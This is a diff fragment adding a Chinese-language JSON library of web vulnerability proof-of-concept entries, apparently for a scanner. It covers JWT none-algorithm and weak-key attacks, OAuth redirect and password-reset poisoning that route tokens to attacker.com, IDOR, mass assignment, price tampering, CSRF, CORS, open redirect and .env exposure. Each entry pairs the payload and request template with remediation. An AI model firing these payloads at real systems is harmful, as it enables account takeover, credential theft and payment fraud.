+    "created_at": 1788087092.711178,
+    "updated_at": 1788087092.711178
+  },
+  "poc-5e7a1bb6": {
+    "poc_id": "poc-5e7a1bb6",
+    "name": "JWT - 算法混淆（none）",
+    "vuln_type": "jwt",
+    "severity": "critical",
+    "cwe_id": "CWE-347",
+    "cve_id": "",
+    "description": "将JWT算法改为none绕过签名验证",
+    "impact": "认证绕过、权限提升、任意用户登录",
+    "remediation": "强制指定算法，不接受none算法",
+    "targets": [
+      "web",
+      "api",
+      "jwt",
+      "oauth"
+    ],
+    "prerequisites": [
+      "使用JWT认证",
+      "服务端接受none算法"
+    ],
+    "payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
+    "poc_code": "",
+    "request_template": "GET /admin HTTP/1.1\nHost: {target}\nAuthorization: Bearer {payload}",
+    "response_indicators": [
+      "认证成功",
+      "访问管理员页面",
+      "权限提升"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "jwt",
+      "auth_bypass",
+      "none_algorithm",
+      "privilege_escalation"
+    ],
+    "created_at": 1788087092.7111826,
+    "updated_at": 1788087092.7111826
+  },
+  "poc-6052fc00": {
+    "poc_id": "poc-6052fc00",
+    "name": "JWT - 弱密钥爆破",
+    "vuln_type": "jwt",
+    "severity": "high",
+    "cwe_id": "CWE-347",
+    "cve_id": "",
+    "description": "通过弱密钥字典爆破JWT签名密钥",
+    "impact": "伪造任意用户Token、权限提升",
+    "remediation": "使用强密钥（256位以上随机字符串）",
+    "targets": [
+      "web",
+      "api",
+      "jwt"
+    ],
+    "prerequisites": [
+      "使用HS256/HS384/HS512",
+      "密钥强度弱"
+    ],
+    "payload": "使用hashcat/jwt_tool爆破密钥，然后伪造admin的token",
+    "poc_code": "",
+    "request_template": "hashcat -m 16500 jwt.txt rockyou.txt",
+    "response_indicators": [
+      "密钥破解成功",
+      "伪造admin token",
+      "认证绕过"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "jwt",
+      "weak_key",
+      "brute_force",
+      "auth_bypass"
+    ],
+    "created_at": 1788087092.7111864,
+    "updated_at": 1788087092.7111866
+  },
+  "poc-563c18e5": {
+    "poc_id": "poc-563c18e5",
+    "name": "OAuth - 重定向URI绕过",
+    "vuln_type": "oauth",
+    "severity": "high",
+    "cwe_id": "CWE-601",
+    "cve_id": "",
+    "description": "通过绕过redirect_uri验证窃取授权码",
+    "impact": "账户接管、权限提升",
+    "remediation": "严格验证redirect_uri，使用精确匹配",
+    "targets": [
+      "web",
+      "oauth",
+      "sso"
+    ],
+    "prerequisites": [
+      "OAuth登录",
+      "redirect_uri验证不严"
+    ],
+    "payload": "redirect_uri=https://attacker.com@trusted.com / redirect_uri=https://trusted.com.attacker.com",
+    "poc_code": "",
+    "request_template": "GET /oauth/authorize?client_id=xxx&redirect_uri={payload}&response_type=code HTTP/1.1",
+    "response_indicators": [
+      "授权码发送到攻击者服务器",
+      "使用授权码获取token",
+      "账户接管"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "oauth",
+      "redirect_uri",
+      "account_takeover",
+      "auth_bypass"
+    ],
+    "created_at": 1788087092.7111905,
+    "updated_at": 1788087092.7111905
+  },
+  "poc-0f805232": {
+    "poc_id": "poc-0f805232",
+    "name": "密码重置 - 令牌预测/投毒",
+    "vuln_type": "password_reset",
+    "severity": "high",
+    "cwe_id": "CWE-640",
+    "cve_id": "",
+    "description": "通过预测重置令牌或Host头投毒接管账户",
+    "impact": "任意账户密码重置、账户接管",
+    "remediation": "使用加密安全的随机令牌，验证Host头，设置令牌过期时间",
+    "targets": [
+      "web",
+      "auth",
+      "password_reset"
+    ],
+    "prerequisites": [
+      "密码重置功能",
+      "令牌可预测或Host头可控"
+    ],
+    "payload": "Host: attacker.com (在重置密码请求中修改Host头) / 预测重置令牌",
+    "poc_code": "",
+    "request_template": "POST /reset-password HTTP/1.1\nHost: attacker.com\n\nemail=victim@example.com",
+    "response_indicators": [
+      "重置邮件包含攻击者链接",
+      "使用重置令牌修改密码",
+      "账户接管"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "password_reset",
+      "host_header",
+      "account_takeover",
+      "token_prediction"
+    ],
+    "created_at": 1788087092.7111945,
+    "updated_at": 1788087092.7111945
+  },
+  "poc-9f6cecf4": {
+    "poc_id": "poc-9f6cecf4",
+    "name": "IDOR - 水平越权",
+    "vuln_type": "idor",
+    "severity": "high",
+    "cwe_id": "CWE-639",
+    "cve_id": "",
+    "description": "通过修改对象ID访问其他用户数据",
+    "impact": "未授权数据访问、信息泄露、数据篡改",
+    "remediation": "对每个对象访问进行权限验证，使用不可预测的ID",
+    "targets": [
+      "web",
+      "api",
+      "user_profile",
+      "order"
+    ],
+    "prerequisites": [
+      "对象ID参数可控",
+      "无权限验证"
+    ],
+    "payload": "修改/user?id=1为/user?id=2 / 修改/order/1001为/order/1002",
+    "poc_code": "",
+    "request_template": "GET /api/users/2 HTTP/1.1\nHost: {target}\nAuthorization: Bearer {user1_token}",
+    "response_indicators": [
+      "返回用户2的数据",
+      "未授权访问",
+      "信息泄露"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "idor",
+      "broken_access_control",
+      "horizontal",
+      "data_exposure"
+    ],
+    "created_at": 1788087092.7111988,
+    "updated_at": 1788087092.7111988
+  },
+  "poc-fc2efd23": {
+    "poc_id": "poc-fc2efd23",
+    "name": "IDOR - 垂直越权",
+    "vuln_type": "idor",
+    "severity": "critical",
+    "cwe_id": "CWE-639",
+    "cve_id": "",
+    "description": "普通用户访问管理员功能",
+    "impact": "权限提升、管理员功能访问",
+    "remediation": "基于角色的访问控制（RBAC），验证用户权限",
+    "targets": [
+      "web",
+      "api",
+      "admin"
+    ],
+    "prerequisites": [
+      "管理员路径可猜测",
+      "无角色验证"
+    ],
+    "payload": "/admin /api/admin/users /management",
+    "poc_code": "",
+    "request_template": "GET /admin HTTP/1.1\nHost: {target}\nCookie: {normal_user_cookie}",
+    "response_indicators": [
+      "访问管理员页面成功",
+      "管理员功能可用",
+      "权限提升"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "idor",
+      "broken_access_control",
+      "vertical",
+      "privilege_escalation"
+    ],
+    "created_at": 1788087092.7112026,
+    "updated_at": 1788087092.7112029
+  },
+  "poc-bc56b077": {
+    "poc_id": "poc-bc56b077",
+    "name": "批量赋值 - Mass Assignment",
+    "vuln_type": "mass_assignment",
+    "severity": "high",
+    "cwe_id": "CWE-915",
+    "cve_id": "",
+    "description": "通过添加额外参数修改受保护字段（is_admin/role等）",
+    "impact": "权限提升、数据篡改",
+    "remediation": "使用白名单限制可更新字段，禁止自动绑定",
+    "targets": [
+      "web",
+      "api",
+      "register",
+      "profile_update"
+    ],
+    "prerequisites": [
+      "框架自动绑定请求参数到对象",
+      "无字段白名单"
+    ],
+    "payload": "{\"username\":\"hacker\",\"password\":\"123\",\"is_admin\":true,\"role\":\"admin\"}",
+    "poc_code": "",
+    "request_template": "POST /api/users/123 HTTP/1.1\nHost: {target}\nContent-Type: application/json\n\n{payload}",
+    "response_indicators": [
+      "is_admin字段被修改",
+      "获得管理员权限",
+      "权限提升"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "mass_assignment",
+      "privilege_escalation",
+      "data_tampering",
+      "api"
+    ],
+    "created_at": 1788087092.711207,
+    "updated_at": 1788087092.7112072
+  },
+  "poc-a0d7c094": {
+    "poc_id": "poc-a0d7c094",
+    "name": "支付逻辑 - 价格篡改",
+    "vuln_type": "logic",
+    "severity": "critical",
+    "cwe_id": "CWE-840",
+    "cve_id": "",
+    "description": "修改订单价格/数量/优惠券参数进行支付绕过",
+    "impact": "经济损失、免费获取商品/服务",
+    "remediation": "服务器端验证价格，不依赖客户端参数",
+    "targets": [
+      "web",
+      "ecommerce",
+      "payment",
+      "order"
+    ],
+    "prerequisites": [
+      "支付参数客户端可控",
+      "服务器端未验证"
+    ],
+    "payload": "price=0.01 / quantity=-1 / coupon=重复使用",
+    "poc_code": "",
+    "request_template": "POST /api/order HTTP/1.1\nHost: {target}\n\n{\"product_id\":1,\"price\":0.01,\"quantity\":1}",
+    "response_indicators": [
+      "订单创建成功",
+      "支付金额为0.01",
+      "经济损失"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "logic",
+      "payment",
+      "price_tampering",
+      "business_logic",
+      "economic_loss"
+    ],
+    "created_at": 1788087092.7112126,
+    "updated_at": 1788087092.7112129
+  },
+  "poc-139939ac": {
+    "poc_id": "poc-139939ac",
+    "name": "CSRF - 跨站请求伪造",
+    "vuln_type": "csrf",
+    "severity": "medium",
+    "cwe_id": "CWE-352",
+    "cve_id": "",
+    "description": "诱导已登录用户执行非预期操作",
+    "impact": "未授权操作、数据篡改、账户变更",
+    "remediation": "使用CSRF Token，验证Referer/Origin，SameSite Cookie",
+    "targets": [
+      "web",
+      "change_password",
+      "transfer",
+      "email_change"
+    ],
+    "prerequisites": [
+      "关键操作无CSRF保护",
+      "用户已登录"
+    ],
+    "payload": "<img src='http://target.com/change-password?new=hacked'/>",
+    "poc_code": "",
+    "request_template": "构造恶意页面，诱导受害者访问",
+    "response_indicators": [
+      "受害者密码被修改",
+      "未授权操作执行",
+      "CSRF成功"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "csrf",
+      "social_engineering",
+      "account_takeover",
+      "web"
+    ],
+    "created_at": 1788087092.711217,
+    "updated_at": 1788087092.711217
+  },
+  "poc-e5973c11": {
+    "poc_id": "poc-e5973c11",
+    "name": "CORS配置错误",
+    "vuln_type": "cors",
+    "severity": "high",
+    "cwe_id": "CWE-942",
+    "cve_id": "",
+    "description": "Origin被反射或ACAO为*且允许凭证",
+    "impact": "跨域数据窃取、认证绕过",
+    "remediation": "严格白名单验证Origin，禁止*+凭证组合",
+    "targets": [
+      "web",
+      "api",
+      "cors"
+    ],
+    "prerequisites": [
+      "CORS配置不严",
+      "有敏感数据接口"
+    ],
+    "payload": "Origin: https://attacker.com",
+    "poc_code": "",
+    "request_template": "GET /api/user/profile HTTP/1.1\nHost: {target}\nOrigin: https://attacker.com\nCookie: {victim_cookie}",
+    "response_indicators": [
+      "Access-Control-Allow-Origin: https://attacker.com",
+      "Access-Control-Allow-Credentials: true",
+      "跨域读取敏感数据"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "cors",
+      "misconfiguration",
+      "data_exposure",
+      "api"
+    ],
+    "created_at": 1788087092.711221,
+    "updated_at": 1788087092.711221
+  },
+  "poc-e7dffd81": {
+    "poc_id": "poc-e7dffd81",
+    "name": "开放重定向",
+    "vuln_type": "open_redirect",
+    "severity": "low",
+    "cwe_id": "CWE-601",
+    "cve_id": "",
+    "description": "通过redirect参数跳转到恶意网站",
+    "impact": "钓鱼攻击、OAuth令牌窃取",
+    "remediation": "白名单验证跳转URL，禁止外部跳转",
+    "targets": [
+      "web",
+      "redirect",
+      "login",
+      "oauth"
+    ],
+    "prerequisites": [
+      "跳转URL参数可控",
+      "无白名单验证"
+    ],
+    "payload": "?redirect=https://attacker.com / ?url=//attacker.com",
+    "poc_code": "",
+    "request_template": "GET /login?redirect={payload} HTTP/1.1\nHost: {target}",
+    "response_indicators": [
+      "302跳转到attacker.com",
+      "钓鱼页面",
+      "OAuth令牌泄露"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "open_redirect",
+      "phishing",
+      "oauth",
+      "low"
+    ],
+    "created_at": 1788087092.7112265,
+    "updated_at": 1788087092.7112267
+  },
+  "poc-ae8b5f7b": {
+    "poc_id": "poc-ae8b5f7b",
+    "name": "敏感信息泄露 - .git/.env",
+    "vuln_type": "info_disclosure",
+    "severity": "high",
+    "cwe_id": "CWE-538",
+    "cve_id": "",
+    "description": "通过访问.git/.env/backup等敏感文件获取凭证",
+    "impact": "数据库凭证泄露、API密钥泄露、源代码泄露",
+    "remediation": "禁止Web访问敏感文件，删除备份文件",
+    "targets": [
+      "web",
+      "git",
+      "env",
+      "backup"
+    ],
+    "prerequisites": [
+      "敏感文件可通过Web访问"
+    ],
+    "payload": "/.git/config /.env /backup.sql /web.config.bak",
+    "poc_code": "",
+    "request_template": "GET /.env HTTP/1.1\nHost: {target}",
+    "response_indicators": [
+      "DB_PASSWORD=",
+      "API_KEY=",
+      "数据库凭证",
+      "Git配置"
+    ],
+    "false_positive_notes": "",
+    "references": [],
+    "tags": [
+      "info_disclosure",
+      "git",
+      "env",
+      "credential_leak",
+      "backup"
+    ],
+    "created_at": 1788087092.7112308,
+    "updated_at": 1788087092.7112308
+  }
+}
